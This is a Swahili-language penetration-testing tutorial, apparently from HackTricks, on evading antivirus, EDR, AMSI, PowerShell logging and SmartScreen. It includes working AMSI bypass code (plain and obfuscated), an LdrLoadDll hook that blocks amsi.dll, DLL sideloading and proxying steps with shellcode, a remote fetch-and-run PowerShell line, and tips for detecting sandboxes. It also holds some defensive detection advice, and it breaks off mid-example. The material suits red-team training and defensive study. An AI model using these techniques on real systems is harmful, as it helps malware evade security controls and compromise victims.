# Kuondokana na Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kuzuia Windows Defender kufanya kazi kwa kuiga AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

## **Mbinu za kukwepa AV**

Hivi sasa, AVs hutumia njia mbalimbali kukagua ikiwa faili ni hatari au la, static detection, dynamic analysis, na kwa EDRs za juu zaidi, behavioural analysis.

### **Static detection**

Static detection inafikiwa kwa kuangazia known malicious strings au arrays za bytes ndani ya binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (mfano: file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kwamba kutumia known public tools kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda zimetathminiwa na kuorodheshwa kama zenye madhara. Kuna njia chache za kuepuka aina hii ya utambuzi:

- **Encryption**

Ikiwa utaencrypt binary, hakuna njia kwa AV ya kugundua programu yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na ku-run programu kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings kwenye binary au script ili zipite kwa AV, lakini hii inaweza kuwa kazi inayoleta ucheleweshaji kulingana na unachojaribu obfuscate.

- **Custom tooling**

Ikiwa utaendeleza tools zako mwenyewe, kutakuwa hakuna known bad signatures, lakini hii inachukua muda mwingi na jitihada.

> [!TIP]
> Njia nzuri ya kukagua dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Inagawanya faili katika segimenti nyingi kisha inalazimisha Defender ku-scan kila moja kwa tofauti; kwa njia hii, inaweza kukuambia hasa ni strings au bytes zipi zilizo-flagged kwenye binary yako.

Ninapendekeza sana uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni wakati AV ina-run binary yako ndani ya sandbox na inatazama shughuli zenye madhara (mfano: kujaribu ku-decrypt na kusoma password za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya nayo kazi, lakini hapa kuna mambo unaweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi imetekwa, inaweza kuwa njia nzuri ya kupita AV's dynamic analysis. AVs wana muda mfupi sana wa ku-scan faili ili wasivurugue workflow ya mtumiaji, hivyo kutumia sleeps ndefu kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes za AV nyingi zinaweza kuruka sleep kulingana na jinsi imetekelezwa.

- **Checking machine's resources** Kwa kawaida Sandboxes huwa na rasilimali chache kufanya kazi nazo (mfano: < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi za fan; si kila kitu kitapangwa ndani ya sandbox.

- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain "contoso.local", unaweza kufanya ukaguzi wa domain ya kompyuta kuona kama inalingana na ile uliyobainisha; ikiwa haitalingani, unaweza kufanya programu yako iondoke.

Imetokea kwamba computername ya Microsoft Defender's Sandbox ni HAL9TH, hivyo unaweza kukagua jina la kompyuta kwenye malware yako kabla ya detonation; ikiwa jina linalingana na HAL9TH, inaonyesha uko ndani ya defender's sandbox, kwa hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri kutoka [@mgeeky](https://twitter.com/mariuszbit) kwa kupambana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **public tools** hatimaye zitakuwa **get detected**, kwa hivyo unapaswa kujiuliza jambo:

Kwa mfano, ikiwa unataka dump LSASS, **je, kweli unahitaji kutumia mimikatz**? Au unaweza kutumia project tofauti isiyojulikana sana na pia inadump LSASS.

Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni moja ya, kama siyo iliyoonyeshwa zaidi, vipande vya malware vinavyoonyeshwa na AVs na EDRs; ingawa project yenyewe ni nzuri, pia ni changamoto kubwa kufanya kazi nayo ili kuepuka AVs, hivyo tafuta mbadala za kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **turn off automatic sample submission** katika defender, na tafadhali, kwa umakini, **DO NOT UPLOAD TO VIRUSTOTAL** ikiwa lengo lako ni kufikia evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, iiweke kwenye VM, jaribu kuzima automatic sample submission, na ijaribu huko hadi utakaporidhika na matokeo.

## EXEs vs DLLs

Kadri inavyowezekana, kila wakati **prioritize using DLLs for evasion**; kwa uzoefu wangu, faili za DLL kawaida huwa **way less detected** na kuchunguzwa, hivyo ni mbinu rahisi kutumiwa kuepuka detection katika baadhi ya kesi (ikiwa payload yako ina njia ya ku-run kama DLL bila shaka).

Kama tunavyoona katika picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>kulinganisha kwa antiscan.me ya normal Havoc EXE payload dhidi ya normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha baadhi ya mbinu unaweza kutumia na faili za DLL ili uwe wa siri zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia faida ya DLL search order inayotumika na loader kwa kuweka programu ya mwathiriwa na malicious payload(s) pembeni kwa kila mmoja.

Unaweza kuangalia programu zinazoweza kushambuliwa na DLL Sideloading kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana uchunge **chunguza programu za DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya kimyakimya ikiwa itafanywa ipasavyo, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kukamatwa kwa urahisi.

Kwa kuingiza tu malicious DLL yenye jina ambalo programu inatarajia kupakia, programu haitapakia payload yako, kwa sababu inatarajia kazi maalum ndani ya DLL hiyo; ili kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka miito ambayo programu inayotuma kutoka kwa proxy (and malicious) DLL kwenda kwa original DLL, hivyo kuendeleza utendaji wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ni hatua nilizozifuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ni matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zote shellcode yetu (imekodishwa na [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina 0/26 kiwango cha utambuzi kwenye [antiscan.me](https://antiscan.me)! Ningeita hiyo mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa kina.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, entry ya export ina kamba ya ASCII ya muundo `TargetDll.TargetFunc`. Wakati caller anapotatua export, Windows loader itafanya:

- Inapakia `TargetDll` ikiwa haijapakiwa
- Inatambua `TargetFunc` kutoka kwake

Tabia kuu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, inatolewa kutoka kwa protected KnownDLLs namespace (kwa mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, hutumika mpangilio wa kawaida wa utafutaji wa DLL, unaojumuisha directory ya module inayofanya forward resolution.

Hii inaruhusu primitive ya indirect sideloading: tafuta signed DLL inayotoa function iliyopelekwa kwa jina la module lisilo-KnownDLL, kisha weka signed DLL hiyo pamoja na attacker-controlled DLL iliyoitwa hasa kama module ya lengo iliyopelekwa. Wakati forwarded export inapoitwa, loader itatatua forward na itapakia DLL yako kutoka saraka hiyo hiyo, ikitekeleza DllMain yako.

Mfano ulioshuhudiwa kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, kwa hivyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyotiwa saini hadi folda inayoweza kuandikishwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka faili `NCRYPTPROV.dll` yenye madhara katika folda ile ile. DllMain ndogo kabisa inatosha kupata utekelezaji wa msimbo; hauitaji kutekeleza forwarded function ili kusababisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati inapopotua `KeyIsoSetAuditingInterface`, loader inafuata forward kwenda `NCRYPTPROV.SetAuditingInterface`
- Loader kisha inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatimizwa, utapokea kosa la "missing API" tu baada ya `DllMain` kuendeshwa

Hunting tips:
- Lenga kwenye forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia inventory ya forwarder ya Windows 11 ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/utetezi:
- Fuatilia LOLBins (mfano, rundll32.exe) zinapopakia signed DLLs kutoka njia zisizo za mfumo, kisha kupakia non-KnownDLLs yenye jina la msingi lilelile kutoka saraka hiyo
- Taarifu kuhusu mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya user-writable paths
- Tekeleza sera za code integrity (WDAC/AppLocker) na kata ruhusa za write+execute kwenye directories za application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Kuepuka kugunduliwa ni kama mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja tu; kama inawezekana, jaribu kuunganisha mbinu tofauti za kuepuka kugunduliwa.

## AMSI (Anti-Malware Scan Interface)

AMSI iliumbwikwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzo, AVs zingeweza tu kuchambua **faili kwenye diski**, hivyo kama ungeweza kwa namna fulani kuendesha payloads **moja kwa moja ndani ya memory**, AV haingeweza kufanya chochote kuzuia hilo, kwa sababu haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeingizwa kwenye vipengele hivi vya Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Hii inawawezesha suluhisho za antivirus kuchunguza tabia za script kwa kufichua yaliyomo ya script kwa namna isiyo iliyosimbwa au isiyofichika.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Tazama jinsi inavyoongeza `amsi:` mwanzoni kisha njia ya executable kutoka ambayo script ilitendeka, katika kesi hii, powershell.exe

Hatujaacha faili yoyote kwenye diski, lakini bado tuliwahi kugunduliwa ndani ya memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, C# code inapotendeka kupitia AMSI pia. Hii hata inaathiri `Assembly.Load(byte[])` kwa ajili ya kuleta utekelezaji ndani ya memory. Ndiyo sababu inashauriwa kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kwa utekelezaji ndani ya memory ikiwa unataka kuepuka AMSI.

Kuna njia kadhaa za kupita AMSI:

- **Obfuscation**

Kwa kuwa AMSI kwa kawaida hufanya kazi na utambuzi wa statiki, hivyo, kubadilisha scripts unazojaribu kuingiza kunaweza kuwa njia nzuri ya kuepuka utambuzi.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation ya scripts hata kama ina tabaka nyingi, hivyo obfuscation inaweza kuwa chaguo duni kulingana na jinsi ilivyofanywa. Hii inafanya kutokuwa rahisi kuepuka. Ingawa, wakati mwingine, unachohitaji tu ni kubadili majina ya vigezo vichache na utakuwa sawa, hivyo inategemea kiwango ambacho kitu kimekithibitishwa.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuingilia kazi yake kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka skanning ya AMSI.

**Forcing an Error**

Kufanya uanzishaji wa AMSI kushindwa (amsiInitFailed) kutasababisha kutakuwa na uchunguzi wowote kwa mchakato wa sasa. Awali hili lilifichuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ya utambuzi ili kuzuia matumizi yake kwa wingi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa powershell code ili kufanya AMSI isifanye kazi kwa mchakato wa powershell wa sasa. Mstari huu, bila shaka, umebainishwa na AMSI mwenyewe, hivyo marekebisho fulani yanahitajika ili kutumia tekniki hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye hii [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Mbinu hii iliigunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata anwani ya kazi ya "AmsiScanBuffer" katika amsi.dll (inyoshughulikia kuchunguza ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurudisha msimbo wa E_INVALIDARG; kwa njia hii, matokeo ya skanisho halisi yatarudisha 0, ambayo hufasiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Kuna pia mbinu nyingine nyingi zinazotumika kupitisha AMSI kwa powershell; angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuhusu hizo.

### Kuzuia AMSI kwa kuzuia upakiaji wa amsi.dll (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa katika mchakato wa sasa. Njia thabiti, isiyotegemea lugha, ya bypass ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` inayorudisha hitilafu wakati moduli inayohitajika ni `amsi.dll`. Kwa hivyo, AMSI haitapakiwa kamwe na hakuna skani itakayofanyika kwa mchakato huo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi kwenye PowerShell, WScript/CScript na custom loaders pia (kitu chochote ambacho kingetumia kuanzisha AMSI).
- Tumia pamoja na kupatia scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu ya command‑line.
- Imewahi kutumika na loaders zinazotekelezwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Zana hii [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) pia huunda script za kupita AMSI.

**Ondoa saini iliyogunduliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwa kumbukumbu ya mchakato wa sasa. Zana hizi zinafanya kazi kwa kuchunguza kumbukumbu ya mchakato wa sasa kutafuta saini ya AMSI kisha kuibadilisha kwa maagizo ya NOP, kwa ufanisi kuiondoa kutoka kwa kumbukumbu.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell toleo la 2**
Ikiwa unatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha script zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kuandika logi za amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa ya matumizi kwa ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa watapeli wanaotaka kuepuka utambuzi**.

Ili kupita PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa ajili ya hili.
- **Tumia PowerShell toleo 2**: Ikiwa utatumia PowerShell toleo 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia Kikao cha PowerShell kisichosimamiwa**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha PowerShell bila kinga (hii ndio `powerpick` kutoka Cobalt Strike inayotumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea kusimba data kwa kutumia encryption, ambayo itaongeza entropy ya binary na kufanya AVs na EDRs iwe rahisi kuibonyea. Kuwa mwangalifu na labda tumia encryption tu kwa sehemu maalum za msimbo wako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa obfuscation kwenye ConfuserEx-protected .NET binaries

Unapochambua malware inayotumia ConfuserEx 2 (au matawi ya kibiashara) ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mwafaka wa kazi hapa chini unaweza kwa uhakika **kurudisha IL karibu-kama-asili** ambayo baadaye inaweza ku-decompile-ishwa kuwa C# kwa zana kama dnSpy au ILSpy.

1.  Kuondolewa kwa anti-tampering – ConfuserEx inasimba kila *method body* na kuisomea ndani ya *module* static constructor (`<Module>.cctor`). Hii pia inaboresha checksum ya PE hivyo mabadiliko yoyote yataharibu binary. Tumia **AntiTamperKiller** kukadiria jedwali za metadata zilizosimbwa, kurejesha funguo za XOR na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Matokeo yanaonyesha vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu wakati unajenga unpacker yako mwenyewe.

2.  Ufufuaji wa alama / control-flow – wnga faili *safi* kwa **de4dot-cex** (fork ya de4dot inayojua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2
• de4dot itafuta flattening ya control-flow, irudishe namespaces, classes na majina ya variable ya asili na kusoma strings zilizowekwa.

3.  Kuondoa proxy-call – ConfuserEx hubadilisha miito ya moja kwa moja ya method kwa wrappers nyepesi (inayojulikana kama *proxy calls*) ili kuvuruga zaidi decompilation. Waondoe kwa kutumia **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii utapata API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mkono – endesha binary iliyopatikana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload ya *kweli*. Mara nyingi malware huihifadhi kama array ya bytes iliyoencoded kwa TLV iliyowekwa ndani ya `<Module>.byte_0`.

Mnyororo huo unaurudisha mtiririko wa utekelezaji **bila** kuwa lazima uendeshe sampuli yenye madhara – ya muhimu unapofanya kazi kwenye workstation isiyounganishwa.

> 🛈  ConfuserEx hutengeneza attribute maalum iitwayo `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kuandaa sampuli kwa njia ya moja kwa moja.

#### Mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa open-source fork ya LLVM compilation suite inayoweza kuongeza usalama wa programu kupitia code obfuscation na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa compile, obfuscated code bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza safu ya obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambayo itafanya maisha ya mtu anayetaka ku-crack application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator yenye uwezo wa ku-obfuscate aina mbalimbali za pe files ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages kutumia ROP (return-oriented programming). ROPfuscator ina-obfuscate programu katika assembly code level kwa kugeuza instructions za kawaida kuwa ROP chains, ikizuia mtiririko wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzizindua

## SmartScreen & MoTW

Unaweza kuwa umeona skrini hii unapotembelea kwa kupakua executables kutoka intaneti na kuzitekeleza.

Microsoft Defender SmartScreen ni mekanisma ya usalama iliyokusudiwa kuwalinda watumiaji dhidi ya kuendesha applications zinazoweza kuwa za kiudanganyifu.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hasa inafanya kazi kwa njia ya reputation-based approach, ikimaanisha kwamba programu ambazo hazipakwi mara kwa mara zitasababisha onyo la SmartScreen na kuzuia mtumiaji kuendesha faili (hata hivyo faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo inaundwa moja kwa moja wakati wa kupakua files kutoka intaneti, pamoja na URL kutoka ambako ilipakuliwa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyopakuliwa kutoka intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kuwa executables zilizosainiwa na cheti cha kusaini **kinachoaminika** **haitasababisha SmartScreen**.

Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes zisizo NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
